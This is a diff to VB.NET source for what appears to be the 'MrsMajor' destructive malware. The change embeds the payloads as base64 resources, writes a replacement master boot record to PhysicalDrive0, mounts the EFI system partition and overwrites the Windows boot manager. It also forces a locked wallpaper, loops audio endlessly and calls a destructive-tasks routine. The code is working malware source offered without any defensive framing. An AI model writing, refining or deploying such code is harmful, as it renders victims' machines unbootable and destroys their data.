@@ -41,6 +41,15 @@ Module Program
     Const OPEN_EXISTING As UInteger = 3
     Const FILE_ATTRIBUTE_NORMAL As UInteger = &H80
 
+    ' Declare the necessary constants and P/Invoke methods
+    Private Const SPI_SETDESKWALLPAPER As Integer = 20
+    Private Const SPIF_UPDATEINIFILE As Integer = &H1
+    Private Const SPIF_SENDCHANGE As Integer = &H2
+
+    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
+    Private Function SystemParametersInfo(uAction As Integer, uParam As Integer, lpvParam As String, fuWinIni As Integer) As Boolean
+    End Function
+
     Sub WriteMBR(ByVal binFilePath As String, ByVal diskPath As String)
         ' Open the binary file for reading
         If Not File.Exists(binFilePath) Then
@@ -132,15 +141,7 @@ Module Program
             Console.WriteLine("Error modifying Policies\ActiveDesktop registry back to 0: " & ex.Message)
         End Try
 
-        ' Set wallpaper and disable changing it
-        Try
-            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Control Panel\Desktop")
-            reg.SetValue("Wallpaper", "Resources1\MrsMajor5.png")
-            reg.SetValue("WallpaperStyle", 2) ' Center wallpaper
-            reg.Close()
-        Catch ex As Exception
-            Console.WriteLine("Error setting wallpaper: " & ex.Message)
-        End Try
+        SetWallpaperFromResource()
 
         Try
             Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop")
@@ -247,9 +248,7 @@ Module Program
                 Next
 
                 ' Perform resource-related operations
-                WriteMBR("Resources1\mrsmajor5mbr.bin", "\\.\PhysicalDrive0")
-                RunCommand("mountvol x: /s")
-                ExtractAndCopyEFI("Resources1\bootmgfw.efi", "X:\EFI\Boot\Microsoft\bootmgfw.efi")
+                PerformResourceOperations()
 
                 ' Show message box after resource tasks are done
                 MsgBox("You messed up... But if you don't click this message nothing's going to happen.", MsgBoxStyle.Critical, "uh oh")
@@ -275,33 +274,111 @@ Module Program
         Application.Run(New MainForm())
     End Sub
 
-    Sub PlayMrsMajorAudioInThread()
-        Dim audioThread As New Thread(AddressOf PlayMrsMajorAudio)
-        audioThread.IsBackground = True
+    Private Sub SetWallpaperFromResource()
+        Try
+            ' Extract the wallpaper image from Resource1
+            Dim wallpaperBytes As Byte() = My.Resources.Resource1.MrsMajor5
+            Dim tempWallpaperPath As String = Path.Combine(Path.GetTempPath(), "MrsMajor5.png")
+
+            ' Write the byte array to a temporary file
+            File.WriteAllBytes(tempWallpaperPath, wallpaperBytes)
+
+            ' Set wallpaper and disable changing it
+            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Control Panel\Desktop")
+            reg.SetValue("Wallpaper", tempWallpaperPath)
+            reg.SetValue("WallpaperStyle", 2) ' Center wallpaper
+            reg.Close()
+
+            ' Refresh the desktop to apply the wallpaper change
+            ' This can be done using the SystemParametersInfo function
+            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempWallpaperPath, SPIF_UPDATEINIFILE Or SPIF_SENDCHANGE)
+
+        Catch ex As Exception
+            Console.WriteLine("Error setting wallpaper: " & ex.Message)
+        End Try
+    End Sub
+
+    Private Sub PerformResourceOperations()
+        Try
+            ' Extract resources from Resource1 as base64 strings
+            Dim mbrResourceBase64 As String = My.Resources.Resource1.mrsmajor5mbr
+            Dim efiResourceBase64 As String = My.Resources.Resource1.bootmgfw
+
+            ' Convert base64 strings to byte arrays
+            Dim mbrResource As Byte() = Convert.FromBase64String(mbrResourceBase64)
+            Dim efiResource As Byte() = Convert.FromBase64String(efiResourceBase64)
+
+            ' Define temporary file paths
+            Dim tempMbrPath As String = Path.Combine(Path.GetTempPath(), "mrsmajor5mbr.bin")
+            Dim tempEfiPath As String = Path.Combine(Path.GetTempPath(), "bootmgfw.efi")
+
+            ' Write the byte arrays to temporary files
+            File.WriteAllBytes(tempMbrPath, mbrResource)
+            File.WriteAllBytes(tempEfiPath, efiResource)
+
+            ' Perform resource-related operations
+            WriteMBR(tempMbrPath, "\\.\PhysicalDrive0")
+            RunCommand("mountvol x: /s")
+            ExtractAndCopyEFI(tempEfiPath, "X:\EFI\Boot\Microsoft\bootmgfw.efi")
+
+            ' Clean up temporary files after operations
+            If File.Exists(tempMbrPath) Then
+                File.Delete(tempMbrPath)
+            End If
+
+            If File.Exists(tempEfiPath) Then
+                File.Delete(tempEfiPath)
+            End If
+
+        Catch ex As Exception
+            Console.WriteLine("Error performing resource operations: " & ex.Message)
+        End Try
+    End Sub
+
+    Private Sub PlayMrsMajorAudioInThread()
+        Dim audioThread As New Thread(AddressOf PlayMrsMajorAudio) With {
+        .IsBackground = True
+    }
         audioThread.Start()
     End Sub
 
-    Sub PlayMrsMajorAudio()
+    Private Sub PlayMrsMajorAudio()
         Try
-            Dim audioFilePath As String = "Resources1\mrsmajor.mp3"
-            If File.Exists(audioFilePath) Then
-                Using audioFileReader As New AudioFileReader(audioFilePath)
-                    Using waveOut As New WaveOutEvent()
-                        waveOut.Init(audioFileReader)
-                        waveOut.Play()
-                        ' Wait for the audio to finish playing
-                        While waveOut.PlaybackState = PlaybackState.Playing
-                            Thread.Sleep(100)
-                        End While
-                    End Using
-                End Using
-            Else
-                Console.WriteLine("Error: Audio file not found at {0}", audioFilePath)
-            End If
+            ' Extract the audio resource from Resource1
+            Dim audioBytes As Byte() = My.Resources.Resource1.mrsmajor
+
+            ' Write the byte array to a temporary file
+            Dim tempFilePath As String = Path.Combine(Path.GetTempPath(), "mrsmajor.mp3")
+            File.WriteAllBytes(tempFilePath, audioBytes)
+
+            ' Play the audio file in an infinite loop
+            Dim waveOut As WaveOutEvent
+            Dim audioFileReader As AudioFileReader
+
+            ' Loop indefinitely
+            Do
+                audioFileReader = New AudioFileReader(tempFilePath)
+                waveOut = New WaveOutEvent()
+                waveOut.Init(audioFileReader)
+                waveOut.Play()
+
+                ' Wait for the audio to finish playing
+                While waveOut.PlaybackState = PlaybackState.Playing
+                    Thread.Sleep(100)
+                End While
+
+                ' Cleanup
+                waveOut.Stop()
+                waveOut.Dispose()
+                audioFileReader.Dispose()
+
+            Loop ' This loop will run indefinitely
+
         Catch ex As Exception
             Console.WriteLine("Error playing startup audio: " & ex.Message)
         End Try
     End Sub
+
     Private Sub PerformDestructiveTasks()
         ' Perform destructive tasks
         Try
